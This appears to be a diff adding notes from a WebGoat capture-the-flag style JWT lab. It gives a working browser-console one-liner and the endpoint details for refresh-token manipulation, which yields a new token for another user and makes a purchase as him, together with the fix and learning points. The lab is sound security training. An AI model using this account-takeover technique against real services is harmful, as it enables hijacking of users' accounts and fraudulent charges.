@@ -1,0 +1,215 @@
+═══════════════════════════════════════════════════════════
+JWT REFRESH TOKEN MANIPULATION - FILES CREATED
+═══════════════════════════════════════════════════════════
+
+📚 ALL FILES FOR THIS CHALLENGE
+
+1. ⭐ JWT_REFRESH_QUICKSTART.txt (THIS FILE IS BEST!)
+   - One-click browser console attack
+   - Copy/paste one-liner
+   - Fastest solution
+   - SUCCESS RATE: ★★★★★
+
+2. jwt_refresh_console_WORKING.txt
+   - Full browser console script with detailed logs
+   - Step-by-step manual fallback
+   - Troubleshooting guide
+   - Alternative methods
+
+3. jwt_refresh_console_attack.txt
+   - Original console script
+   - Multiple variations
+   - Detailed explanations
+
+4. jwt_refresh_attack_pwsh.ps1
+   - PowerShell automation attempt
+   - Has issues with WebGoat login format
+   - Use browser console instead
+
+5. jwt_refresh_token_attack.ps1
+   - First PowerShell attempt
+   - Includes manual instructions
+
+6. jwt_refresh_attack.html
+   - Web-based GUI tool
+   - Has CORS issues (can't fetch from file://)
+   - Use console script instead
+
+═══════════════════════════════════════════════════════════
+
+✅ RECOMMENDED METHOD
+
+Use: JWT_REFRESH_QUICKSTART.txt
+
+1. Open http://192.168.254.112:8001/WebGoat/JWT
+2. Navigate to "Refreshing a token" lesson
+3. F12 → Console
+4. Paste the one-liner from JWT_REFRESH_QUICKSTART.txt
+5. Press Enter
+6. ✅ Done!
+
+═══════════════════════════════════════════════════════════
+
+🎯 THE ONE-LINER (Copy from here)
+
+(async function(){const T='eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE1MjYxMzE0MTEsImV4cCI6MTUyNjIxNzgxMSwiYWRtaW4iOiJmYWxzZSIsInVzZXIiOiJUb20ifQ.DCoaq9zQkyDH25EcVWKcdbyVfUL4c9D4jRvsqOqvi9iAd4QuqmKcchfbU8FNzeBNF9tLeFXHZLU4yRkq-bjm7Q';const d=t=>JSON.parse(atob(t.split('.')[1].replace(/-/g,'+').replace(/_/g,'/')));console.log('%c[1] Tom expired','color:cyan');const l=await(await fetch('/WebGoat/JWT/refresh/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({user:'Tom',password:'x'})})).json();console.log('%c[2] Got my refresh token','color:green');const a=await(await fetch('/WebGoat/JWT/refresh/newToken',{method:'POST',headers:{'Authorization':'Bearer '+T,'Content-Type':'application/json'},body:JSON.stringify({refresh_token:l.refresh_token})})).json();console.log('%c[3] ⚡ Got Tom new token - user:'+d(a.access_token).user,'color:red;font-weight:bold');const c=await(await fetch('/WebGoat/JWT/refresh/checkout',{method:'POST',headers:{'Authorization':'Bearer '+a.access_token,'Content-Type':'application/json'}})).json();console.log('%c[4] 🎉 SUCCESS! Tom paid!','color:green;font-size:18px;font-weight:bold');console.log(c);})();
+
+═══════════════════════════════════════════════════════════
+
+📖 ATTACK EXPLANATION
+
+Based on Mikail's Bug Bounty Report (Bugcrowd, Nov 2017):
+https://emtunc.org/blog/11/2017/jwt-refresh-token-manipulation/
+
+VULNERABILITY:
+Authorization Server doesn't check that refresh_token
+belongs to the user in the access_token.
+
+ATTACK FLOW:
+1. Tom's expired token from log → user='Tom', EXPIRED ❌
+2. Get OUR refresh token → belongs to us ✅
+3. Send refresh request:
+   - Authorization: Bearer <Tom's expired token>
+   - Body: { refresh_token: <OUR refresh token> }
+4. Server validates OUR refresh token ✅
+5. Server issues NEW token for Tom (from access token) ❌
+6. Use Tom's NEW token to checkout → Tom pays! 💰
+
+IMPACT:
+- Attacker can hijack any account with old token
+- Access token expiration becomes meaningless
+- Very difficult to revoke (refresh token still works)
+
+FIX:
+Server MUST verify: access_token.user === refresh_token.user
+
+═══════════════════════════════════════════════════════════
+
+🔑 KEY DATA
+
+Tom's Expired Token (from access log):
+eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE1MjYxMzE0MTEsImV4cCI6MTUyNjIxNzgxMSwiYWRtaW4iOiJmYWxzZSIsInVzZXIiOiJUb20ifQ.DCoaq9zQkyDH25EcVWKcdbyVfUL4c9D4jRvsqOqvi9iAd4QuqmKcchfbU8FNzeBNF9tLeFXHZLU4yRkq-bjm7Q
+
+Decoded:
+{
+  "iat": 1526131411,
+  "exp": 1526217811,
+  "admin": "false",
+  "user": "Tom"
+}
+
+Log Entry (where token was found):
+194.201.170.15 - - [28/Jan/2016:21:28:01 +0100] 
+"GET /refresh/checkout?token=eyJhbGci... HTTP/1.1" 401
+
+═══════════════════════════════════════════════════════════
+
+🎯 ENDPOINTS
+
+1. POST /WebGoat/JWT/refresh/login
+   Body: {"user":"Tom","password":"x"}
+   Returns: {"access_token":"...", "refresh_token":"..."}
+   Purpose: Get YOUR refresh token
+
+2. POST /WebGoat/JWT/refresh/newToken
+   Header: Authorization: Bearer <Tom's expired token>
+   Body: {"refresh_token":"<YOUR refresh token>"}
+   Returns: {"access_token":"<Tom's NEW token>"}
+   Purpose: THE ATTACK - Get new token for Tom
+
+3. POST /WebGoat/JWT/refresh/checkout
+   Header: Authorization: Bearer <Tom's new token>
+   Returns: Success message
+   Purpose: Make Tom pay for the books
+
+═══════════════════════════════════════════════════════════
+
+✅ SUCCESS INDICATORS
+
+Browser Console Output:
+- [1] Tom expired (cyan)
+- [2] Got my refresh token (green)
+- [3] ⚡ Got Tom new token - user:Tom (red, bold)
+- [4] 🎉 SUCCESS! Tom paid! (green, 18px, bold)
+- Response object with success data
+
+WebGoat Page:
+- Green checkmark ✓
+- "Congratulations!" message
+- Lesson marked as complete
+
+═══════════════════════════════════════════════════════════
+
+⚠️ COMMON ISSUES & FIXES
+
+Issue: "Failed to fetch" or CORS error
+Fix: Must run in browser console on WebGoat page
+     http://192.168.254.112:8001/WebGoat/JWT
+
+Issue: 404 on /JWT/refresh/login
+Fix: Navigate to "Refreshing a token" lesson first
+     It should be in the JWT section
+
+Issue: 401 Unauthorized
+Fix: Make sure you're logged into WebGoat
+     Try refreshing the page
+
+Issue: "fetch is not defined"
+Fix: You're in PowerShell/terminal, not browser
+     Press F12 in browser, go to Console tab
+
+Issue: Response is HTML instead of JSON
+Fix: Wrong endpoint or not logged in
+     Check Network tab (F12) to see actual response
+
+═══════════════════════════════════════════════════════════
+
+📊 CHALLENGE STATUS
+
+Challenge Name: "Refreshing a token"
+Lesson: JWT (JSON Web Token)
+WebGoat Version: 2025.3
+Target: http://192.168.254.112:8001/WebGoat/JWT
+
+Required Actions:
+✅ Find Tom's expired token in log
+✅ Get your own refresh token
+✅ Execute refresh token manipulation attack
+✅ Get new valid token for Tom
+✅ Checkout as Tom (make him pay $31.53)
+
+═══════════════════════════════════════════════════════════
+
+💡 LEARNING POINTS
+
+1. Refresh tokens must be tied to specific users
+2. Server must validate token ownership, not just validity
+3. Old/expired access tokens can still be dangerous
+4. Proper refresh flow requires:
+   - Store refresh_token → user_id mapping
+   - Validate refresh_token belongs to access_token.user
+   - Rotate refresh tokens on each use
+   - Monitor for suspicious patterns
+
+5. JWT security is about MORE than signature validation
+
+═══════════════════════════════════════════════════════════
+
+🎓 NEXT STEPS AFTER THIS CHALLENGE
+
+After completing "Refreshing a token", you have:
+
+✅ Challenge 1: Become Admin & Reset Votes (COMPLETE)
+✅ Challenge 2: JWT Secret Cracking (COMPLETE)
+❓ Challenge 3: Buy Samsung Phone for Free (PENDING)
+❓ Challenge 4: Find Flag in Photo Comments (PENDING)
+
+Ready to continue with Challenge 3? 🚀
+
+═══════════════════════════════════════════════════════════
+
+Tom: "Why is my credit card charged $31.53?" 💳
+You: "Must be a bug in the authorization server..." 😏
+WebGoat: "Congratulations! Vulnerability understood!" ✅
+
+═══════════════════════════════════════════════════════════
